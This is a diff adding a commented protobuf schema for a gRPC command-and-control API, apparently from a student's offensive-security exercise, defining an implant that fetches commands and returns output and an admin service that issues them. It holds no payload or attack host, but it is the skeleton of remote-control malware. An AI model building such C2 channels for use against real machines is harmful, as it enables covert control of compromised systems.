@@ -1,0 +1,33 @@
+//implant.proto
+//a file used to create from the ground up our API for operators to use. differs from a RESTful API, in that we are using gRPC instead of GET requests to URLs.
+//this essetnially acts like a VERY constrained API that does not need to re-open a TCP connection each time that a new API call is to be made. It is more lightweight, and
+//if the API is not defined in this proto file, then it is disregarded. lurv it.
+//additionally, this is a schema, not a full implimentation; in Golang this is interface-like in nature.
+//to complie the schema to a binary go can understand, we run the command " protoc -I . implant.proto --go_out=plugins=grpc:./" in the /grpcapi directory.
+//previous command is depreciated, use "protoc --go-grpc_out=. ./implant.proto" instead to generate the file in it's own directory.  
+syntax = "proto3";
+package grpcapi; //tells the compiler that we want to keep the artifacts; the name is arbitrary, we just need to name it something reasonable to compile and invoke with the other binaries.
+option go_package = "./implant";
+//Implant defines the C2 API functions
+service Implant {
+    rpc FetchCommand (Empty) returns (Command);
+    rpc SendOutput (Command) returns (Empty);
+}
+
+//Admin only features
+service Admin {
+    rpc RunCommand (Command) returns (Command);
+}
+
+//messages are "complex data structures" used to actually pass commands to and from the server. I guess the best way to compare them would be my UDP structs from Laplace/duckchat.
+//Command defines an input to ingest for the API. has an input and output feild
+message Command {
+    //these act as offsets, we are basically saying that the "in" message will come first, and the "out" message will come second. These offsets are also arbitrary.
+    string In = 1;
+    string Out = 2;
+}
+
+//Empty message is used in place of NULL for this API/.
+message Empty {
+    //nothing is here on purpose.
+}
